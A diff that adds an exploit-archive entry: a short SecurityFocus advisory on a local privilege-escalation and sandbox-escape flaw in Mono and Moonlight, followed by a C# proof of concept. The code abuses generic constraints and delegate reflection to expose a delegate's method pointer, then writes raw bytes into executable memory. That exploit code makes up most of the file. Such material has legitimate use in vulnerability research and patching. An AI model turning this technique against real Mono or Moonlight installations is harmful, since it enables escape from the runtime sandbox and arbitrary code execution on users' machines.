@@ -1,0 +1,48 @@
+Source:  http://www.securityfocus.com/bid/45051/info
+
+Mono and Moonlight is prone to a local privilege-escalation vulnerability.
+
+Local attackers can exploit this issue to execute arbitrary code with elevated privileges. Successful exploits will compromise the affected application and possibly the underlying computer. 
+
+PoC:
+
+using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+public class DelegateWrapper {
+    public IntPtr method_ptr;
+}
+
+public delegate void MethodWrapper ();
+
+public class BreakSandbox {
+    private static DelegateWrapper Convert <T> (T dingus) where T :
+DelegateWrapper {
+        return dingus;
+    }
+
+    private static DelegateWrapper ConvertDelegate (Delegate del) {
+        var m = typeof (BreakSandbox).GetMethod ("Convert",
+BindingFlags.NonPublic | BindingFlags.Static);
+        var gm = m.MakeGenericMethod (typeof (Delegate));
+
+        var d = (Func <Delegate, DelegateWrapper>) Delegate.CreateDelegate
+(typeof (Func <Delegate, DelegateWrapper>), null, gm);
+
+        return d (del);
+    }
+
+    public static void Main (string [] args) {
+        MethodWrapper d = delegate {
+            Console.WriteLine ("Hello");
+        };
+
+        d ();
+        var converted = ConvertDelegate (d);
+        // Overwrite the already WX page with a 'ret'
+        Marshal.WriteByte (converted.method_ptr, (byte) 0xc3);
+        d ();
+    }
+}
+
